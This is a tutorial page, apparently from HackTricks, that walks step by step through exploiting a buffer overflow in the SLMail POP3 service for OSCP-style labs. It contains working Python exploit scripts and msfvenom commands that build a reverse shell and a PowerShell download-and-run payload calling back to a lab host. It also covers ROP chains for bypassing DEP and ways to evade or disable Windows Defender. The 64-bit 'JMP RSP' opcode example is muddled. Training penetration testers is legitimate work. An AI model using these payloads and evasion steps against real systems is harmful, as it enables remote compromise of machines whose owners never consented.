# Windows Exploiting (Basic Guide - OSCP lvl)

{{#include ../banners/hacktricks-training.md}}

## **Start installing the SLMail service**

## Restart SLMail service

Every time you need to **restart the service SLMail** you can do it using the windows console:

```
net start slmail
```

![](<../images/image (988).png>)

## Very basic python exploit template

```python
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

buffer = 'A' * 2700
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
```

## **Change Immunity Debugger Font**

Go to `Options >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK`

## **Attach the proces to Immunity Debugger:**

**File --> Attach**

![](<../images/image (869).png>)

**And press START button**

## **Send the exploit and check if EIP is affected:**

![](<../images/image (906).png>)

Every time you break the service you should restart it as is indicated in the beginnig of this page.

## Create a pattern to modify the EIP

The pattern should be as big as the buffer you used to broke the service previously.

![](<../images/image (420).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Change the buffer of the exploit and set the pattern and lauch the exploit.

A new crash should appeard, but with a different EIP address:

![](<../images/image (636).png>)

Check if the address was in your pattern:

![](<../images/image (418).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438
```

Looks like **we can modify the EIP in offset 2606** of the buffer.

Check it modifing the buffer of the exploit:

```
buffer = 'A'*2606 + 'BBBB' + 'CCCC'
```

With this buffer the EIP crashed should point to 42424242 ("BBBB")

![](<../images/image (874).png>)

![](<../images/image (92).png>)

Looks like it is working.

## Check for Shellcode space inside the stack

600B should be enough for any powerfull shellcode.

Lets change the bufer:

```
buffer = 'A'*2606 + 'BBBB' + 'C'*600
```

launch the new exploit and check the EBP and the length of the usefull shellcode

![](<../images/image (119).png>)

![](<../images/image (879).png>)

You can see that when the vulnerability is reached, the EBP is pointing to the shellcode and that we have a lot of space to locate a shellcode here.

In this case we have **from 0x0209A128 to 0x0209A2D6 = 430B.** Enough.

## Check for bad chars

Change again the buffer:

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = 'A'*2606 + 'BBBB' + badchars
```

The badchars starts in 0x01 because 0x00 is almost always bad.

Execute repeatedly the exploit with this new buffer delenting the chars that are found to be useless:.

For example:

In this case you can see that **you shouldn't use the char 0x0A** (nothing is saved in memory since the char 0x09).

![](<../images/image (111).png>)

In this case you can see that **the char 0x0D is avoided**:

![](<../images/image (1098).png>)

## Find a JMP ESP as a return address

Using:

```
!mona modules    #Get protections, look for all false except last one (Dll of SO)
```

You will **list the memory maps**. Search for some DLl that has:

- **Rebase: False**
- **SafeSEH: False**
- **ASLR: False**
- **NXCompat: False**
- **OS Dll: True**

![](<../images/image (555).png>)

Now, inside this memory you should find some JMP ESP bytes, to do that execute:

```
!mona find -s "\xff\xe4" -m name_unsecure.dll # Search for opcodes insie dll space (JMP ESP)
!mona find -s "\xff\xe4" -m slmfc.dll # Example in this case
```

**Then, if some address is found, choose one that don't contain any badchar:**

![](<../images/image (605).png>)

**In this case, for example: _0x5f4a358f_**

## Create shellcode

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\x00\x0a\x0d'
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -f python -b '\x00\x0a\x0d'
```

If the exploit is not working but it should (you can see with ImDebg that the shellcode is reached), try to create other shellcodes (msfvenom with create different shellcodes for the same parameters).

**Add some NOPS at the beginning** of the shellcode and use it and the return address to JMP ESP, and finish the exploit:

```bash
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

shellcode = (
"\xb8\x30\x3f\x27\x0c\xdb\xda\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x45\x12\x83\xed\xfc\x03\x75\x31\xc5\xf9\x89\xa5\x8b"
"... (snip) ..."
)

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + "\x90" * 8 + shellcode
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
```

> [!WARNING]
> There are shellcodes that will **overwrite themselves**, therefore it's important to always add some NOPs before the shellcode

## Improving the shellcode

Add this parameters:

```bash
EXITFUNC=thread -e x86/shikata_ga_nai
```

---

## 2023-2025: Modern Windows Exploitation Notes

### 1. From Immunity-DBG to x64dbg (Python 3 ready)
Immunity Debugger has not seen active development since 2017 and does not run natively on Windows 11. For recent targets you may prefer **x64dbg**, which supports both 32-bit and 64-bit applications and can be extended with Python 3.

1. Install the latest nightly of x64dbg (https://x64dbg.com).
2. Install the `x64dbgpy` plugin (via the built-in plugin manager) and then drop `mona.py` together with [`x64dbgpylib`](https://github.com/x64dbg/x64dbgpylib) in the `x32\plugins\python` directory so that the familiar `!mona` commands work again. 
3. All commands used in this guide (e.g. `!mona modules`, `!mona pattern_create`, `!mona rop`) remain identical.

> **Tip:** x64dbg shortcuts are slightly different.  `Ctrl+G` to go to an address and `Ctrl+Alt+E` to open the modules view.

### 2. 64-bit applications – `JMP RSP` instead of `JMP ESP`
On 64-bit processes the stack pointer register is **RSP**. When exploiting 64-bit services you will therefore search for the opcode sequence `FF E4` **or** `FF 24 25` that translates to `JMP RSP`.

```
!mona find -s "\xff\xe4" -m vulnerable.dll     # 32-bit (jmp esp)
!mona find -s "\xff\xe4" -m vulnerable.dll     # 64-bit (jmp rsp – same bytes!)
```

The rest of the process (finding offsets, bad-chars, etc.) is exactly the same, although offsets will usually be **much larger** due to 64-bit stack alignment requirements.

### 3. DEP & ASLR bypass with Mona generated ROP chains
Modern Windows services are almost always compiled with **DEP** (NX) and **ASLR**. Mona can still generate a ready-to-use chain that calls `VirtualProtect` or `VirtualAlloc` to mark our shellcode region as RWX:

```
!mona rop -cpb "\x00\x0a\x0d" -m slmfc.dll -f virtualprotect
```

This produces `rop_chains.txt` with a function similar to:

```python
def create_rop_chain():
    rop_gadgets = [
        0x5f473b6b,  # MOV EAX,DWORD PTR DS:[ECX] ; RETN [SLMFC.DLL]
        0x5f468e7b,  # PUSH EAX ; PUSHAD ; POP ESI ; RETN [SLMFC.DLL]
        ...
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)
```

Place the return address that pivots into the above chain where we previously used the `JMP ESP/RSP`. 430 bytes of stack space is enough for a complete `VirtualProtect()` ROP chain. 

### 4. Control-Flow Guard & Shadow Stacks (CET)
Windows 10 introduced **Control Flow Guard (CFG)** to protect indirect calls, and Windows 11 (22H2) enables **Hardware-enforced Stack Protection** (a.k.a **Shadow Stacks**) on suitably new CPUs. These mitigations break classic ROP by validating each call/return.

* CFG is *per-binary* — look for legacy DLLs compiled **without** `/guard:cf` and pivot execution into them.
* Shadow Stack is disabled for 32-bit processes and for processes that are not compiled with the required flags, which is still the default for many third-party services.
* In lab environments you can disable both mitigations via **Exploit Protection** → *Program Settings* or the `Set-ProcessMitigation -Disable` PowerShell cmdlet.

Understanding how these defences work helps to quickly decide whether you need a ROP-based DEP bypass or if you can still drop directly into shellcode. 

### 5. EDR / Windows Defender tricks during PoC development
1. Use `Add-MpPreference -ExclusionProcess ImmunityDebugger.exe` while testing to prevent AV from killing your vulnerable service.
2. Encode payloads (`-e x86/shikata_ga_nai`, `-e x86/add_sub`) or deliver them staged over the network with a tool such as **dnscat2** to avoid writing the raw shellcode to disk.

> [!TIP]  In an OSCP exam you control the target, so you can usually *disable* Defender entirely with `sc stop WinDefend`.



## References
- Corelan Team – mona.py manual (updated 2024)  
- Microsoft Docs – Kernel-mode Hardware-enforced Stack Protection (2024)
{{#include ../banners/hacktricks-training.md}}
